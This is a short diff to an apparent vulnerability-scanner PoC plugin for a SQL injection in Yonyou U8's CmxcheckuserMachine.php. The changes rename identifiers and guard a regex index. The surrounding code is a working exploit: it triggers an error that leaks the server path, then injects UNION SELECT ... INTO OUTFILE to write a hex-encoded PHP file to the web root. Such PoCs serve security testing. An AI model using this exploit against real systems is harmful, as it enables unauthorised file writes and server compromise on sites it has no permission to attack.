@@ -7,7 +7,7 @@ import os
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'yongyou_0036' # 平台漏洞编号，留空
+    vuln_id = 'Yonyou_0036' # 平台漏洞编号，留空
     name = '用友优谱u8系统cmxcheckuserMachine.php注入' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
@@ -18,7 +18,7 @@ class Vuln(ABVuln):
     ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0130069' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown' #cve编号
-    product = '用友'  # 漏洞应用名称
+    product = 'Yonyou(用友)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
@@ -38,8 +38,8 @@ class Poc(ABPoc):
             payload='/Server/CmxcheckuserMachine.php?b=1&a=1'
             url = arg + payload
             code1, head1, res1, errcode1, _url1 = hh.http(url+'%bf')
-            m = re.findall('<b>(.*?)</b>',res1)
-            shell_path = str(os.path.dirname(m[1])) + '\\testvul.php'
+            m = re.findall('<b>(.*?)</b>',res1)[1] if re.findall('<b>(.*?)</b>',res1) else ""
+            shell_path = str(os.path.dirname(m)) + '\\testvul.php'
             shell_path = re.sub(r'\\',r'\\\\',shell_path)
             exp_code = "'%20and%201=2%20union%20select%200x3c3f706870206563686f206d64352831293b756e6c696e6b285f5f46494c455f5f293b3f3e%20into%20outfile%20'{}'%23".format(shell_path)
             code2, head2, res2, errcode2, _url2 = hh.http(url+exp_code)
